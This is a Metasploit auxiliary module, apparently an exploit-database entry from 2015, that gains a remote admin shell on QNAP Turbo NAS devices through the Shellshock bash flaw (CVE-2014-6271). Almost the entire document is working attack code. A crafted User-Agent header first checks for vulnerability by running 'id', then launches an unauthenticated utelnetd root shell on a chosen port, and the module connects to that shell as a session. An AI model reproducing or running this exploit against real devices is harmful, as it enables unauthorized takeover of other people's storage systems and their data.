# Date: 7 February 2015
# Exploit Author: Patrick Pellegrino | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
# Employer homepage: http://www.securegroup.it
# Vendor homepage: http://www.qnap.com
# Version: All Turbo NAS models except TS-100, TS-101, TS-200
# Tested on: TS-1279U-RP
# CVE : 2014-6271
# Vendor URL bulletin : http://www.qnap.com/i/it/support/con_show.php?cid=61
 
 
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/d3vpp/metasploit-modules
##
 
require &#039;msf/core&#039;
require &#039;net/telnet&#039;
 
class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CommandShell
 
   def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;QNAP admin shell via Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039; => %q{
        This module allows you to spawn a remote admin shell (utelnetd) on a QNAP device via Bash Environment Variable Code Injection.
        Affected products:
        All Turbo NAS models except TS-100, TS-101, TS-200
        },
      &#039;Author&#039; => [&#039;Patrick Pellegrino&#039;], # Metasploit module | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
            [&#039;CVE&#039;, &#039;2014-6271&#039;], #aka ShellShock
            [&#039;URL&#039;, &#039;http://www.qnap.com/i/it/support/con_show.php?cid=61&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;]
    ))
 
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to CGI script&#039;,&#039;/cgi-bin/index.cgi&#039;]),
      OptPort.new(&#039;LTELNET&#039;, [true, &#039;Set the remote port where the utelnetd service will be listening&#039;,&#039;9993&#039;])
    ], self.class)
  end
 
 def check
    begin
    res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path),
        &#039;agent&#039; => "() { :;}; echo; /usr/bin/id"
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
        vprint_error("Connection failed")
        return Exploit::CheckCode::Unknown
 end
     
    if !res
      return Exploit::CheckCode::Unknown
    elsif res.code== 302 and res.body.include? &#039;uid&#039;
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
     
 
  def exploit_telnet()
    telnetport = datastore[&#039;LTELNET&#039;]
 
    print_status("#{rhost}:#{rport} - Telnet port used: #{telnetport}")
 
    print_status("#{rhost}:#{rport} - Sending exploit")
    begin
      sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => telnetport.to_i })
 
      if sock
        print_good("#{rhost}:#{rport} - Backdoor service spawned")
        add_socket(sock)
      else
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service not spawned")
      end
 
      print_status "Starting a Telnet session #{rhost}:#{telnetport}"
      merge_me = {
        &#039;USERPASS_FILE&#039; => nil,
        &#039;USER_FILE&#039;     => nil,
        &#039;PASS_FILE&#039;     => nil,
        &#039;USERNAME&#039;      => nil,
        &#039;PASSWORD&#039;      => nil
      }
      start_session(self, "TELNET (#{rhost}:#{telnetport})", merge_me, false, sock)
    rescue
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service not handled")
    end
    return
  end
 
  def run
    begin
    telnetport = datastore[&#039;LTELNET&#039;]
    res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path),
        &#039;agent&#039; => "() { :;}; /bin/utelnetd -l/bin/sh -p#{telnetport} &"
      })           
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
    exploit_telnet()
     
  end
     
end

